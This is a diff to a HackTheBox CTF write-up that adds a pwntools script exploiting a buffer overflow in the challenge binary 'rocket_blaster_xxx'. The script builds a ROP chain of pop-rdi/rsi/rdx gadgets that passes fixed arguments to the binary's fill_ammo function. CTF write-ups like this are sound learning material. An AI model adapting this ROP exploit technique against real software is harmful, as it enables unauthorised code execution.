@@ -45,7 +45,54 @@
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/65206058-c5e4-499d-932a-6e217ab06019)
 
 
-8. Seems the gadgets are provided to us. We can utilize it then.
+8. Nice! The gadgets are available.
+9. We can do simple ROP then, here's the crafted script.
+
+> SCRIPT
+
+```py
+from pwn import *
+
+exe = './rocket_blaster_xxx'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+# context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = process(exe)
+
+rop = ROP(elf)
+p = flat([
+    cyclic(40),
+    rop.find_gadget([
+        'ret'
+    ]).address,
+    rop.find_gadget([
+        'pop rdi',
+        'ret'
+    ]).address,
+    0xdeadbeef,
+    rop.find_gadget([
+        'pop rsi',
+        'ret'
+    ]).address,
+    0xdeadbabe,
+    rop.find_gadget([
+        'pop rdx',
+        'ret'
+    ]).address,
+    0xdead1337,
+    elf.sym['fill_ammo']
+])
+
+sh.sendline(p)
+sh.interactive()
+```
+
+> REMOTE TEST
+
 
 
 
